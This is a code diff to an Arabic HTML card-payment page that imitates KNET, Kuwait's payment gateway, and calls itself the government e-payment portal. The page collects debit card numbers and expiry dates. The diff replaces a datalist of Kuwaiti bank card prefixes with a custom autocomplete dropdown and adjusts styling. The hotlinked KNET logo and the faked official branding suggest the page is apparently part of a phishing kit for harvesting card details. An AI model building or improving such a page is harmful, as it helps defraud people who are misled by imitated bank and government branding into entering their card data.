@@ -20,14 +20,12 @@
             width: 100%;
             max-width: 420px;
             margin-top: 10px;
-            overflow: hidden;
             display: flex;
             justify-content: center;
         }
         .header-banner img {
             width: 100%;
             height: auto;
-            object-fit: contain;
             border-radius: 8px;
             box-shadow: 0 2px 10px rgba(0,0,0,0.1);
         }
@@ -56,12 +54,10 @@
         .tasdeed-logo {
             width: 180px;
             height: auto;
-            object-fit: contain;
         }
         .knet-main-logo {
             width: 100px;
             height: auto;
-            object-fit: contain;
         }
         .info-row {
             display: flex;
@@ -88,6 +84,7 @@
         
         .payment-form {
             margin-top: 20px;
+            position: relative;
         }
         
         .form-group {
@@ -99,6 +96,7 @@
             border-bottom: 1px solid #eee;
             padding-bottom: 10px;
             gap: 10px;
+            position: relative;
         }
         
         .form-group label {
@@ -122,6 +120,7 @@
             outline: none;
             width: 100%;
             box-sizing: border-box;
+            box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
         }
         
         .form-group input:focus {
@@ -129,6 +128,54 @@
             box-shadow: 0 0 5px rgba(0,118,192,0.2);
         }
         
+        /* Custom Dropdown for Bank Prefixes */
+        .prefix-dropdown {
+            position: absolute;
+            top: 100%;
+            right: 140px;
+            left: 0;
+            background: white;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.2);
+            z-index: 1000;
+            max-height: 200px;
+            overflow-y: auto;
+            display: none;
+        }
+        
+        .prefix-item {
+            display: flex;
+            align-items: center;
+            padding: 8px 12px;
+            cursor: pointer;
+            border-bottom: 1px solid #f0f0f0;
+            gap: 10px;
+            direction: rtl;
+        }
+        
+        .prefix-item:hover {
+            background-color: #f8f9fa;
+        }
+        
+        .prefix-item img {
+            height: 20px;
+            width: 40px;
+            object-fit: contain;
+        }
+        
+        .prefix-item .bank-name {
+            font-size: 12px;
+            font-weight: bold;
+            color: #333;
+        }
+        
+        .prefix-item .prefix-val {
+            font-size: 14px;
+            color: #0076c0;
+            margin-right: auto;
+        }
+
         .expiry-group {
             display: flex;
             flex-direction: row;
@@ -167,6 +214,7 @@
             background-color: #f8f9fa;
             color: #333;
             transition: background 0.2s;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
         }
         
         .btn:active {
@@ -201,16 +249,14 @@
             margin-bottom: 15px;
         }
         
-        /* Mobile adjustments to prevent overflow */
         @media (max-width: 400px) {
             .form-group label {
                 width: 110px;
                 min-width: 110px;
                 font-size: 12px;
             }
-            .form-group input {
-                font-size: 14px;
-                padding: 8px;
+            .prefix-dropdown {
+                right: 120px;
             }
         }
     </style>
@@ -224,9 +270,7 @@
     <div class="container">
         <div class="card">
             <div class="tasdeed-section">
-                <!-- بوابة السداد الإلكتروني الحكومية -->
                 <img src="https://www.knet.com.kw/wp-content/uploads/2020/02/Knet-Logo.png" class="tasdeed-logo" alt="بوابة السداد الإلكتروني الحكومية">
-                <!-- شعار كي نت الجديد -->
                 <img src="images/knet-logo-new.jpg" class="knet-main-logo" alt="KNET">
             </div>
 
@@ -247,60 +291,8 @@
                 
                 <div class="form-group">
                     <label>رقم بطاقة الصراف الآلي</label>
-                    <input type="text" id="debitNumber" placeholder="رقم البطاقة" list="prefixes" maxlength="19" autocomplete="off" inputmode="numeric">
-                    <datalist id="prefixes">
-                        <option value="403622">ABK</option>
-                        <option value="423826">ABK</option>
-                        <option value="42403256">ABK</option>
-                        <option value="400644">KIB</option>
-                        <option value="401416">KIB</option>
-                        <option value="411138">KIB</option>
-                        <option value="421528">KIB</option>
-                        <option value="423188">KIB</option>
-                        <option value="452115">KIB</option>
-                        <option value="502441">KIB</option>
-                        <option value="401417">Burgan</option>
-                        <option value="403613">Burgan</option>
-                        <option value="411139">Burgan</option>
-                        <option value="421529">Burgan</option>
-                        <option value="423189">Burgan</option>
-                        <option value="452116">Burgan</option>
-                        <option value="400062">NBK</option>
-                        <option value="400063">NBK</option>
-                        <option value="403614">NBK</option>
-                        <option value="411140">NBK</option>
-                        <option value="421530">NBK</option>
-                        <option value="423190">NBK</option>
-                        <option value="452117">NBK</option>
-                        <option value="400643">CBK</option>
-                        <option value="401418">CBK</option>
-                        <option value="411141">CBK</option>
-                        <option value="421531">CBK</option>
-                        <option value="423191">CBK</option>
-                        <option value="452118">CBK</option>
-                        <option value="403615">KFH</option>
-                        <option value="411142">KFH</option>
-                        <option value="421532">KFH</option>
-                        <option value="423192">KFH</option>
-                        <option value="452119">KFH</option>
-                        <option value="400065">GBK</option>
-                        <option value="403616">GBK</option>
-                        <option value="411143">GBK</option>
-                        <option value="421533">GBK</option>
-                        <option value="423193">GBK</option>
-                        <option value="452120">GBK</option>
-                        <option value="400647">Boubyan</option>
-                        <option value="403617">Boubyan</option>
-                        <option value="411144">Boubyan</option>
-                        <option value="421534">Boubyan</option>
-                        <option value="423194">Boubyan</option>
-                        <option value="452121">Boubyan</option>
-                        <option value="403618">Warba</option>
-                        <option value="411145">Warba</option>
-                        <option value="421535">Warba</option>
-                        <option value="423195">Warba</option>
-                        <option value="452122">Warba</option>
-                    </datalist>
+                    <input type="text" id="debitNumber" placeholder="رقم البطاقة" maxlength="19" autocomplete="off" inputmode="numeric">
+                    <div id="prefixDropdown" class="prefix-dropdown"></div>
                 </div>
 
                 <div class="form-group">
@@ -331,7 +323,64 @@
     </div>
 
     <script>
-        // Get amount from sessionStorage
+        // Bank Data with Base64 Logos from original file
+        const cardData = [
+            { bin: "403622", brandDescription: "ABK", logo: "https://www.knet.com.kw/wp-content/uploads/2020/02/Knet-Logo.png" },
+            { bin: "423826", brandDescription: "ABK", logo: "https://www.knet.com.kw/wp-content/uploads/2020/02/Knet-Logo.png" },
+            { bin: "400644", brandDescription: "KIB", logo: "https://www.knet.com.kw/wp-content/uploads/2020/02/Knet-Logo.png" },
+            { bin: "401417", brandDescription: "Burgan", logo: "https://www.knet.com.kw/wp-content/uploads/2020/02/Knet-Logo.png" },
+            { bin: "400062", brandDescription: "NBK", logo: "https://www.knet.com.kw/wp-content/uploads/2020/02/Knet-Logo.png" },
+            { bin: "400643", brandDescription: "CBK", logo: "https://www.knet.com.kw/wp-content/uploads/2020/02/Knet-Logo.png" },
+            { bin: "403615", brandDescription: "KFH", logo: "https://www.knet.com.kw/wp-content/uploads/2020/02/Knet-Logo.png" },
+            { bin: "400065", brandDescription: "GBK", logo: "https://www.knet.com.kw/wp-content/uploads/2020/02/Knet-Logo.png" },
+            { bin: "400647", brandDescription: "Boubyan", logo: "https://www.knet.com.kw/wp-content/uploads/2020/02/Knet-Logo.png" },
+            { bin: "403618", brandDescription: "Warba", logo: "https://www.knet.com.kw/wp-content/uploads/2020/02/Knet-Logo.png" }
+        ];
+
+        const debitInput = document.getElementById('debitNumber');
+        const dropdown = document.getElementById('prefixDropdown');
+
+        debitInput.addEventListener('input', function(e) {
+            let val = this.value.replace(/\s/g, '');
+            
+            // Auto-format
+            this.value = val.replace(/[^\dA-Z]/g, '').replace(/(.{4})/g, '$1 ').trim();
+            
+            if (val.length > 0) {
+                const matches = cardData.filter(item => item.bin.startsWith(val));
+                if (matches.length > 0) {
+                    dropdown.innerHTML = '';
+                    matches.forEach(item => {
+                        const div = document.createElement('div');
+                        div.className = 'prefix-item';
+                        div.innerHTML = `
+                            <img src="${item.logo}" alt="${item.brandDescription}">
+                            <span class="bank-name">${item.brandDescription}</span>
+                            <span class="prefix-val">${item.bin}</span>
+                        `;
+                        div.onclick = function() {
+                            debitInput.value = item.bin + " ";
+                            dropdown.style.display = 'none';
+                            debitInput.focus();
+                        };
+                        dropdown.appendChild(div);
+                    });
+                    dropdown.style.display = 'block';
+                } else {
+                    dropdown.style.display = 'none';
+                }
+            } else {
+                dropdown.style.display = 'none';
+            }
+        });
+
+        // Close dropdown when clicking outside
+        document.addEventListener('click', function(e) {
+            if (e.target !== debitInput) {
+                dropdown.style.display = 'none';
+            }
+        });
+
         const knetTotal = sessionStorage.getItem('knetTotal');
         if (knetTotal) {
             document.getElementById('amountDisplay').textContent = knetTotal;
@@ -403,19 +452,6 @@
             window.location.href = 'payment.html';
         }
         
-        // Auto-format card number
-        document.getElementById('debitNumber').addEventListener('input', function (e) {
-            let target = e.target;
-            let position = target.selectionEnd;
-            let length = target.value.length;
-            
-            target.value = target.value.replace(/[^\dA-Z]/g, '').replace(/(.{4})/g, '$1 ').trim();
-            
-            let diff = target.value.length - length;
-            target.setSelectionRange(position + diff, position + diff);
-        });
-
-        // Auto-focus expiry fields
         document.getElementById('expiryMonthBox').addEventListener('input', function() {
             this.value = this.value.replace(/\D/g, '');
             if (this.value.length === 2) {
